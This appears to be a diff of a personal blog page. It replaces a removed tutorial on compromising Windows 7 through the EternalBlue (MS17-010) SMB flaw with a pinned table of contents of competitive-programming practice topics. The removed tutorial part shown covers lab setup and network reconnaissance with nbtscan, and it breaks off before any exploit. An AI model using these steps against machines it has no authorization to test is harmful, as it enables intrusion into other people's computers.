@@ -8,7 +8,7 @@
 <meta name="keywords" content="Gridea静态个人博客">
 <meta name="description" content="一个蒟蒻OIer">
 <meta name="theme-color" content="#91a7ff">
-<title>利用“永恒之蓝”漏洞进行Win7渗透的演示 | zxh23682 的博客</title>
+<title>【置顶】试炼场 | zxh23682 的博客</title>
 <link rel="shortcut icon" href="/favicon.ico?v=1609845123894">
 <link rel="stylesheet" href="/media/css/gemini.css">
 <link rel="stylesheet" href="/media/fonts/font-awesome.css">
@@ -38,7 +38,7 @@
 
 
 
-  <meta name="description" content="利用“永恒之蓝”漏洞进行Win7渗透的演示" />
+  <meta name="description" content="【置顶】试炼场" />
   <meta name="keywords" content="随笔" />
 </head>
 
@@ -177,7 +177,8 @@
       <div class="sidebar-body gemini" id="sidebar_body">
         
           
-            
+            <div class="post-side-meta" id="post_side_meta">
+              
 <div class="sidebar-wrapper box-shadow-wrapper bg-color">
   <div class="sidebar-item">
     <img class="site-author-image right-motion" src="/images/avatar.png"/>
@@ -231,6 +232,311 @@
   </div>
 
 </div>
+            </div>
+            <div class="post-toc sidebar-body-active" id="post_toc" style="opacity: 1;">
+              <div class="toc-box right-motion">
+  <div class="toc-wrapper auto-number auto"
+    id="toc_wrapper">
+    <ul class="markdownIt-TOC">
+<li><a href="#%E6%96%B0%E6%89%8B%E6%9D%91">新手村</a>
+<ul>
+<li><a href="#%E6%B4%9B%E8%B0%B7%E7%9A%84%E7%AC%AC%E4%B8%80%E4%B8%AA%E4%BB%BB%E5%8A%A1">洛谷的第一个任务</a></li>
+<li><a href="#%E9%A1%BA%E5%BA%8F%E4%B8%8E%E5%88%86%E6%94%AF">顺序与分支</a></li>
+<li><a href="#%E5%BE%AA%E7%8E%AF%E5%BE%AA%E7%8E%AF%E5%BE%AA%E7%8E%AF">循环！循环！循环！</a></li>
+<li><a href="#%E6%95%B0%E7%BB%84">数组</a></li>
+<li><a href="#%E7%AE%80%E5%8D%95%E5%AD%97%E7%AC%A6%E4%B8%B2">简单字符串</a></li>
+<li><a href="#%E8%BF%87%E7%A8%8B%E5%87%BD%E6%95%B0%E4%B8%8E%E9%80%92%E5%BD%92">过程函数与递归</a></li>
+<li><a href="#boss%E6%88%98-%E5%85%A5%E9%97%A8%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A01">BOSS战-入门综合练习1</a></li>
+<li><a href="#boss%E6%88%98-%E5%85%A5%E9%97%A8%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A02">BOSS战-入门综合练习2</a></li>
+</ul>
+</li>
+<li><a href="#%E6%99%AE%E5%8F%8A%E7%BB%83%E4%B9%A0%E5%9C%BA">普及练习场</a>
+<ul>
+<li><a href="#%E7%AE%80%E5%8D%95%E7%9A%84%E6%A8%A1%E6%8B%9F">简单的模拟</a></li>
+<li><a href="#%E4%BA%A4%E5%8F%89%E6%A8%A1%E6%8B%9F">交叉模拟</a></li>
+<li><a href="#%E6%8E%92%E5%BA%8F">排序</a></li>
+<li><a href="#%E6%8E%92%E5%BA%8Fex">排序Ex</a></li>
+<li><a href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86">字符串处理</a></li>
+<li><a href="#%E8%B4%AA%E5%BF%83">贪心</a></li>
+<li><a href="#%E6%B7%B1%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2">深度优先搜索</a></li>
+<li><a href="#%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2">广度优先搜索</a></li>
+<li><a href="#%E5%B8%A6%E6%9C%89%E6%8A%80%E5%B7%A7%E7%9A%84%E6%90%9C%E7%B4%A2">带有技巧的搜索</a></li>
+<li><a href="#%E5%88%86%E6%B2%BB%E7%AE%97%E6%B3%95">分治算法</a></li>
+<li><a href="#%E7%AE%80%E5%8D%95%E6%95%B0%E5%AD%A6%E9%97%AE%E9%A2%98">简单数学问题</a></li>
+<li><a href="#%E9%80%92%E6%8E%A8%E4%B8%8E%E9%80%92%E5%BD%92%E4%BA%8C%E5%88%86">递推与递归二分</a></li>
+<li><a href="#%E7%BA%BF%E6%80%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84">线性数据结构</a></li>
+<li><a href="#%E6%A0%91%E5%BD%A2%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84">树形数据结构</a></li>
+<li><a href="#%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E7%9A%84%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98">动态规划的背包问题</a></li>
+<li><a href="#%E7%BA%BF%E6%80%A7%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92">线性动态规划</a></li>
+<li><a href="#%E5%A4%9A%E7%BB%B4%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92">多维动态规划</a></li>
+<li><a href="#%E6%9B%B4%E8%A6%81%E6%8A%80%E5%B7%A7%E7%9A%84%E5%8A%A8%E8%A7%84%E4%B8%8E%E8%AE%B0%E5%BF%86%E5%8C%96">更要技巧的动规与记忆化</a></li>
+<li><a href="#%E9%AB%98%E7%B2%BE%E5%BA%A6%E7%AE%97%E6%B3%95">高精度算法</a></li>
+<li><a href="#%E8%B4%AA%E5%BF%83ex">贪心EX</a></li>
+<li><a href="#%E7%AE%80%E5%8D%95%E6%95%B0%E5%AD%A6">简单数学</a></li>
+<li><a href="#boss%E6%88%98-%E6%99%AE%E5%8F%8A%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A01">BOSS战-普及综合练习1</a></li>
+<li><a href="#boss%E6%88%98-%E6%99%AE%E5%8F%8A%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A02">BOSS战-普及综合练习2</a></li>
+<li><a href="#boss%E6%88%98-%E6%99%AE%E5%8F%8A%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A03">BOSS战-普及综合练习3</a></li>
+<li><a href="#%E6%99%AE%E5%8F%8A%E5%B8%B8%E8%A7%81%E6%A8%A1%E6%9D%BF">普及常见模板</a></li>
+</ul>
+</li>
+<li><a href="#%E6%8F%90%E9%AB%98%E5%8E%86%E7%BB%83%E5%9C%B0">提高历练地</a>
+<ul>
+<li><a href="#%E6%90%9C%E7%B4%A2ex">搜索Ex</a></li>
+<li><a href="#%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92tglv1">动态规划TG.lv(1)</a></li>
+<li><a href="#%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92tglv2">动态规划TG.lv(2)</a></li>
+<li><a href="#%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92tglv3">动态规划TG.lv(3)</a></li>
+<li><a href="#%E6%95%B0%E8%AE%BA">数论</a></li>
+<li><a href="#%E5%8D%9A%E5%BC%88%E8%AE%BA">博弈论</a></li>
+<li><a href="#%E5%85%B6%E4%BB%96%E6%95%B0%E5%AD%A6%E9%97%AE%E9%A2%98">其他数学问题</a></li>
+<li><a href="#%E5%9B%BE%E7%9A%84%E9%81%8D%E5%8E%86">图的遍历</a></li>
+<li><a href="#%E6%9C%80%E7%9F%AD%E8%B7%AF%E9%97%AE%E9%A2%98">最短路问题</a></li>
+<li><a href="#%E6%9C%80%E5%B0%8F%E7%94%9F%E6%88%90%E6%A0%91">最小生成树</a></li>
+<li><a href="#%E8%BE%83%E5%A4%8D%E6%9D%82%E5%9B%BE%E8%AE%BAi">较复杂图论I</a></li>
+<li><a href="#%E8%BE%83%E5%A4%8D%E6%9D%82%E5%9B%BE%E8%AE%BAii">较复杂图论II</a></li>
+<li><a href="#%E5%B9%B6%E6%9F%A5%E9%9B%86">并查集</a></li>
+<li><a href="#%E5%A0%86">堆</a></li>
+<li><a href="#%E7%BA%BF%E6%AE%B5%E6%A0%91%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84%E5%9F%BA%E7%A1%80">线段树树状数组基础</a></li>
+<li><a href="#%E7%A5%9E%E5%A5%87%E7%9A%84%E8%A7%A3%E6%B3%95">神奇的解法</a></li>
+<li><a href="#%E5%80%8D%E5%A2%9E">倍增</a></li>
+<li><a href="#%E5%BC%BA%E8%BF%9E%E9%80%9A%E5%88%86%E9%87%8F">强连通分量</a></li>
+<li><a href="#boss%E6%88%98-%E6%8F%90%E9%AB%98%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A01">BOSS战-提高综合练习1</a></li>
+<li><a href="#boss%E6%88%98-%E6%8F%90%E9%AB%98%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A02">BOSS战-提高综合练习2</a></li>
+<li><a href="#boss%E6%88%98-%E6%8F%90%E9%AB%98%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A03">BOSS战-提高综合练习3</a></li>
+<li><a href="#%E6%8F%90%E9%AB%98%E6%A8%A1%E6%9D%BF-nlogn%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84">提高模板-nlogn数据结构</a></li>
+</ul>
+</li>
+<li><a href="#%E7%9C%81%E9%80%89%E6%96%97%E5%85%BD%E5%9C%BAnoi%E7%A5%9E%E6%AE%BF">省选斗兽场/NOI神殿</a>
+<ul>
+<li><a href="#%E7%9C%81%E9%80%89%E5%9F%BA%E7%A1%80-%E8%AF%BB%E5%85%A5%E8%BE%93%E5%87%BA%E4%BC%98%E5%8C%96">省选基础-读入/输出优化</a></li>
+<li><a href="#%E7%9C%81%E9%80%89%E5%9F%BA%E7%A1%80-%E4%BD%8D%E8%BF%90%E7%AE%97">省选基础-位运算</a></li>
+<li><a href="#%E7%9C%81%E9%80%89%E5%9F%BA%E7%A1%80-%E6%89%93%E8%A1%A8">省选基础-打表</a></li>
+<li><a href="#%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%921">动态规划1</a></li>
+<li><a href="#%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%922">动态规划2</a></li>
+<li><a href="#%E7%BD%91%E7%BB%9C%E6%B5%81%E6%9C%80%E5%A4%A7%E6%B5%81">网络流——最大流</a></li>
+<li><a href="#%E7%BD%91%E7%BB%9C%E6%B5%81%E8%B4%B9%E7%94%A8%E6%B5%81">网络流——费用流</a></li>
+<li><a href="#%E5%8D%95%E8%B0%83%E9%98%9F%E5%88%97">单调队列</a></li>
+<li><a href="#%E6%A6%82%E7%8E%87%E6%9C%9F%E6%9C%9B">概率期望</a></li>
+<li><a href="#%E4%BA%8C%E5%88%86%E5%9B%BE">二分图</a></li>
+<li><a href="#%E7%82%B9%E5%88%86%E6%B2%BB">点分治</a></li>
+<li><a href="#%E5%90%8E%E7%BC%80%E6%95%B0%E7%BB%84">后缀数组</a></li>
+<li><a href="#%E4%B8%BB%E5%B8%AD%E6%A0%91">主席树</a></li>
+<li><a href="#%E6%95%B0%E4%BD%8Ddp">数位DP</a></li>
+<li><a href="#ac%E8%87%AA%E5%8A%A8%E6%9C%BA">AC自动机</a></li>
+<li><a href="#%E5%B9%B3%E8%A1%A1%E6%A0%91">平衡树</a></li>
+<li><a href="#%E6%A0%91%E9%93%BE%E5%89%96%E5%88%86">树链剖分</a></li>
+<li><a href="#%E5%8A%A8%E6%80%81%E6%A0%91">动态树</a></li>
+<li><a href="#%E6%A0%91%E5%A5%97%E6%A0%91">树套树</a></li>
+<li><a href="#%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96trie%E6%A0%91">可持久化Trie树</a></li>
+<li><a href="#%E8%8E%AB%E9%98%9F%E7%AE%97%E6%B3%95">莫队算法</a></li>
+<li><a href="#%E5%88%86%E5%9D%97">分块</a></li>
+<li><a href="#%E8%8E%AB%E6%AF%94%E4%B9%8C%E6%96%AF%E5%8F%8D%E6%BC%94">莫比乌斯反演</a></li>
+<li><a href="#%E5%85%B6%E4%BB%96">其他</a></li>
+</ul>
+</li>
+<li><a href="#usaco">USACO</a>
+<ul>
+<li><a href="#usaco-section-11">USACO Section 1.1</a></li>
+<li><a href="#usaco-section-12">USACO Section 1.2</a></li>
+<li><a href="#usaco-section-13">USACO Section 1.3</a></li>
+<li><a href="#usaco-section-14">USACO Section 1.4</a></li>
+<li><a href="#usaco-section-15">USACO Section 1.5</a></li>
+<li><a href="#usaco-section-21">USACO Section 2.1</a></li>
+<li><a href="#usaco-section-22">USACO Section 2.2</a></li>
+<li><a href="#usaco-section-23">USACO Section 2.3</a></li>
+<li><a href="#usaco-section-24">USACO Section 2.4</a></li>
+<li><a href="#usaco-section-31">USACO Section 3.1</a></li>
+<li><a href="#usaco-section-32">USACO Section 3.2</a></li>
+<li><a href="#usaco-section-33">USACO Section 3.3</a></li>
+<li><a href="#usaco-section-34">USACO Section 3.4</a></li>
+<li><a href="#usaco-section-41">USACO Section 4.1</a></li>
+<li><a href="#usaco-section-42">USACO Section 4.2</a></li>
+<li><a href="#usaco-section-43">USACO Section 4.3</a></li>
+<li><a href="#usaco-section-44">USACO Section 4.4</a></li>
+<li><a href="#usaco-section-51">USACO Section 5.1</a></li>
+<li><a href="#usaco-section-52">USACO Section 5.2</a></li>
+<li><a href="#usaco-section-53">USACO Section 5.3</a></li>
+<li><a href="#usaco-section-54">USACO Section 5.4</a></li>
+<li><a href="#usaco-section-55">USACO Section 5.5</a></li>
+</ul>
+</li>
+</ul>
+
+  </div>
+</div>
+
+<script>
+
+  let lastTop = 0, lList = [], hList = [], postBody, lastIndex = -1;
+  let active = 'active-show', activeClass = 'active-current';
+  let tocWrapper = document.querySelector('#toc_wrapper');
+  let tocContent = tocWrapper.children[0];
+  let autoNumber = tocWrapper && tocWrapper.classList.contains('auto-number');
+
+  function addTocNumber(elem, deep) {
+    if (!elem) {
+      return;
+    }
+    let prop = elem.__proto__;
+
+    if (prop === HTMLUListElement.prototype) {
+      for (let i = 0; i < elem.children.length; i++) {
+        addTocNumber(elem.children[i], deep + (i + 1) + '.');
+      }
+    } else if (prop === HTMLLIElement.prototype) {
+      // 保存li元素
+      if (elem.children[0] && elem.children[0].__proto__ === HTMLAnchorElement.prototype) {
+        lList.push(elem);
+      }
+      for (let i = 0; i < elem.children.length; i++) {
+        let cur = elem.children[i];
+        if (cur.__proto__ === HTMLAnchorElement.prototype) {
+          if (autoNumber) {
+            cur.text = deep + ' ' + cur.text;
+          }
+        } else if (cur.__proto__ === HTMLUListElement.prototype) {
+          addTocNumber(cur, deep);
+        }
+      }
+    }
+  }
+
+  function removeParentActiveClass() {
+    let parents = tocContent.querySelectorAll('.' + active)
+    parents.forEach(function (elem) {
+      elem.classList.remove(active);
+    });
+  }
+
+  function addActiveClass(index) {
+    if (index >= 0 && index < hList.length) {
+      lList[index].classList.add(activeClass);
+    }
+  }
+
+  function removeActiveClass(index) {
+    if (index >= 0 && index < hList.length) {
+      lList[index].classList.remove(activeClass);
+    }
+  }
+
+  function addActiveLiElemment(elem, parent) {
+    if (!elem || elem === parent) {
+      return;
+    } else {
+      if (elem.__proto__ === HTMLLIElement.prototype) {
+        elem.classList.add(active);
+      }
+      addActiveLiElemment(elem.parentElement, parent);
+    }
+  }
+
+  function showToc() {
+    if (tocWrapper) {
+      postBody = document.querySelector('#post_body');
+      for (let i = 0; i < postBody.children.length; i++) {
+        if (postBody.children[i].__proto__ === HTMLHeadingElement.prototype) {
+          hList.push(postBody.children[i]);
+        }
+      }
+      if (tocWrapper.classList.contains('compress')) {
+        tocContent.classList.add('closed');
+      } else if (tocWrapper.classList.contains('no_compress')) {
+        tocContent.classList.add('expanded');
+      } else {
+        if (hList.length > 10) {
+          active = 'active-hidden'
+          tocContent.classList.add('closed');
+        } else {
+          tocContent.classList.add('expanded');
+        }
+      }
+    }
+  }
+
+  (function () {
+    // 处理不是从#一级标题开始目录
+    if (tocContent.children.length === 1 && tocContent.children[0].__proto__ === HTMLLIElement.prototype) {
+      let con = tocContent.children[0].children[0];
+      tocContent.innerHTML = con.innerHTML;
+    }
+    let markdownItTOC = document.querySelector('.markdownIt-TOC');
+    let innerHeight = window.innerHeight;
+    markdownItTOC.style = `max-height: ${innerHeight - 80 > 0 ? innerHeight - 80 : innerHeight}px`
+    addTocNumber(tocContent, '');
+  })();
+
+  document.addEventListener('scroll', function (e) {
+    if (lList.length <= 0) {
+      return;
+    }
+    let scrollTop = document.scrollingElement.scrollTop + 10;
+    let dir;
+
+    if (lastTop - scrollTop > 0) {
+      dir = 'up';
+    } else {
+      dir = 'down';
+    }
+
+    lastTop = scrollTop;
+    if (scrollTop <= 0) {
+      if (lastIndex >= 0 && lastIndex < hList.length) {
+        lList[lastIndex].classList.remove(activeClass);
+      }
+      return;
+    }
+
+    let current = 0, hasFind = false;
+    for (let i = 0; i < hList.length; i++) {
+      if (hList[i].offsetTop > scrollTop) {
+        current = i;
+        hasFind = true;
+        break;
+      }
+    }
+    if (!hasFind && scrollTop > lList[lList.length - 1].offsetTop) {
+      current = hList.length - 1;
+    } else {
+      current--;
+    }
+    if (dir === 'down') {
+      if (current > lastIndex) {
+        addActiveClass(current);
+        removeActiveClass(lastIndex)
+        lastIndex = current;
+        removeParentActiveClass();
+        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
+      }
+    } else {
+      if (current < lastIndex) {
+        addActiveClass(current);
+        removeActiveClass(lastIndex);
+        lastIndex = current;
+        removeParentActiveClass();
+        lList[current] && addActiveLiElemment(lList[current].parentElement, tocContent);
+      }
+    }
+  });
+
+
+  window.addEventListener('load', function () {
+    showToc();
+    document.querySelector('#sidebar').style = 'display: block;';
+    tocWrapper.classList.add('toc-active');
+    setTimeout(function () {
+      if ("createEvent" in document) {
+        let evt = document.createEvent("HTMLEvents");
+        evt.initEvent("scroll", false, true);
+        document.dispatchEvent(evt);
+      }
+      else {
+        document.fireEvent("scroll");
+      }
+    }, 500)
+  })
+
+</script>
+            </div>
           
         
       </div>
@@ -318,16 +624,22 @@
           <div class="section bg-color post post-page">
             <section class="post-header">
   <h1 class="post-title">
-    <a class="post-title-link" href="https://zxh23682.github.io/post/li-yong-yong-heng-zhi-lan-lou-dong-jin-xing-win7-shen-tou-de-yan-shi/">
-      利用“永恒之蓝”漏洞进行Win7渗透的演示
+    <a class="post-title-link" href="https://zxh23682.github.io/post/shi-lian-chang/">
+      【置顶】试炼场
     </a>
   </h1>
   <div class="post-meta">
     
+    <span class="meta-item">
+      <i class="fa fa-thumb-tack"></i>
+      <span class="language" data-lan="top">置顶</span>
+      <span class="post-meta-divider">|</span>
+    </span>
+    
     <span class="meta-item pc-show">
       <i class="fa fa-calendar-o"></i>
       <span class="language" data-lan="publish">发布于</span>
-      <span class="publish-time" data-t="2020-11-15 09:52:49">2020-11-15</span>
+      <span class="publish-time" data-t="2021-01-05 19:06:50">2021-01-05</span>
       <span class="post-meta-divider pc-show">|</span>
     </span>
     
@@ -346,17 +658,17 @@
     
     <span class="meta-item">
       <i class="fa fa-clock-o"></i>
-      <span>5<span class="language" data-lan="minute">分钟</span></span>
+      <span>39<span class="language" data-lan="minute">分钟</span></span>
     </span>
     <span class="meta-item">
       <span class="post-meta-divider">|</span>
       <i class="fa fa-file-word-o"></i>
-      <span>1187<span class="pc-show language" data-lan="words">字数</span></span>
+      <span>8508<span class="pc-show language" data-lan="words">字数</span></span>
     </span>
     
     
     
-    <span id="/post/li-yong-yong-heng-zhi-lan-lou-dong-jin-xing-win7-shen-tou-de-yan-shi/" data-flag-title="利用“永恒之蓝”漏洞进行Win7渗透的演示" class="meta-item pc-show leancloud_visitors">
+    <span id="/post/shi-lian-chang/" data-flag-title="【置顶】试炼场" class="meta-item pc-show leancloud_visitors">
       <span class="post-meta-divider">|</span>
       <i class="fa fa-eye"></i>
       <span><span class="language" data-lan="view">浏览量</span>：<span class="leancloud-visitors-count"></span></span>
@@ -365,79 +677,1438 @@
   </div>
 </section>
             <div class="post-body next-md-body" id="post_body">
-              <p>本文仅供演示与讲解，因为滥用此漏洞而造成他人财产损失,本人一概不负责任。</p>
-<hr>
-<p>“永恒之蓝” 漏洞，于数年前被黑客组织 “影子经纪人” 曝出，随后也催生了 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi><mi>a</mi><mi>n</mi><mi>n</mi><mi>a</mi><mi>c</mi><mi>r</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">Wannacry</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span> 勒索病毒等。微软已经在 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>s</mi><mn>17</mn><mo>−</mo><mn>010</mn></mrow><annotation encoding="application/x-tex">ms17-010</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">s</span><span class="mord">1</span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord">1</span><span class="mord">0</span></span></span></span> 补丁中修复了这个漏洞。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi><mi>i</mi><mi>n</mi><mn>7</mn></mrow><annotation encoding="application/x-tex">Win7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord">7</span></span></span></span> 是这个漏洞的重灾区（当然之前的 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>X</mi><mi>P</mi><mo separator="true">,</mo><mi>V</mi><mi>i</mi><mi>s</mi><mi>t</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">XP,Vista</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">X</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span></span></span></span> 等也有这个漏洞）。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi><mi>i</mi><mi>n</mi><mn>10</mn></mrow><annotation encoding="application/x-tex">Win10</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord">1</span><span class="mord">0</span></span></span></span> 已经修复了这个漏洞，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi><mi>i</mi><mi>n</mi><mn>7</mn></mrow><annotation encoding="application/x-tex">Win7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord">7</span></span></span></span> 要开防火墙并且装补丁，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>P</mi><mn>1</mn></mrow><annotation encoding="application/x-tex">SP1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord">1</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mi>P</mi><mn>2</mn></mrow><annotation encoding="application/x-tex">SP2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord">2</span></span></span></span> 都一样。</p>
-<p>这个漏洞利用的是 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>445</mn></mrow><annotation encoding="application/x-tex">445</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">4</span><span class="mord">4</span><span class="mord">5</span></span></span></span> 端口，是 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>o</mi><mi>w</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">Windows</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">s</span></span></span></span> 的 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>m</mi><mi>b</mi></mrow><annotation encoding="application/x-tex">smb</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">m</span><span class="mord mathdefault">b</span></span></span></span> 功能中的漏洞。</p>
-<p>话不多说，我们现在来复现这个漏洞。</p>
-<p>准备工作：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mi>a</mi><mi>l</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">kali</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span></span></span></span> <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>l</mi><mi>i</mi><mi>n</mi><mi>u</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">linux</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">u</span><span class="mord mathdefault">x</span></span></span></span> 一台（可以是虚拟机），<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi><mi>i</mi><mi>n</mi><mn>7</mn></mrow><annotation encoding="application/x-tex">Win7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord">7</span></span></span></span> 一台（也可以是虚拟机，注意要关闭防火墙和杀软的）。注意两台机器要连到同一个网络。</p>
-<figure data-type="image" tabindex="1"><img src="https://ericnth.cn/wp-content/uploads/2020/07/image-20.png" alt="" loading="lazy"></figure>
-<hr>
-<p>第一步：打开终端，输入 <code>ifconfig</code> 。可以看到第二行有一个“ <code>inet 192.168.0.115</code> ”，这是 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mi>a</mi><mi>l</mi><mi>i</mi></mrow><annotation encoding="application/x-tex">kali</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span></span></span></span> 的内网 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">ip</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">p</span></span></span></span> ，记录下它。</p>
-<figure data-type="image" tabindex="2"><img src="https://ericnth.cn/wp-content/uploads/2020/07/image-19.png" alt="" loading="lazy"></figure>
-<p>第二步：执行 <code>sudo nbtscan -r kali的ip/24</code> ，注意把 <code>kali的ip</code> 换成上一步您得到的内网 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">ip</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">p</span></span></span></span> ，得到以下结果（结果因人而异）。这是这个网络下的所有计算机，看看有没有你熟悉的名字呢。找到你要渗透的那台 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>W</mi><mi>i</mi><mi>n</mi><mn>7</mn></mrow><annotation encoding="application/x-tex">Win7</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span 